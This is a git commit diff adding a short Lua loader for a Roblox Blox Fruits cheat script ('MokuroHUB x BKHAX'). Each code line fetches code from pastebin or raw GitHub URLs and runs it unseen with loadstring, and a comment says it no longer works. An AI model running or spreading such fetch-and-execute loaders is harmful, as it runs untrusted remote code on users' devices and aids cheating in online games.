d99cbcc06037cb8bdad4cf71d04a6191da48b8f4
Jam The Adventurer <94430800+JamTheAdventurer@users.noreply.github.com>
2022-04-22 19:52:34 +0800

    Create Loadstring.lua

---
+++ Scripts/Bloxfruits/MokuroHUB+/Loadstring.lua
@@ -0,0 +1,10 @@
+loadstring(game:HttpGet(("https://pastebin.com/raw/dJeV6Via"),true))()
+-- FPS Booster ^^
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xDepressionx/Free-Script/main/BloxFruit.lua"))()
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/koonpeatch/PeatEX/master/BKHAX/BloxFruits"),true))()
+-- Main Script MokuroHUB x BKHAX ^^
+
+-- Information:
+-- Updated since April 6th
+--
+-- i This Script no longer works please make an issue regarding the script
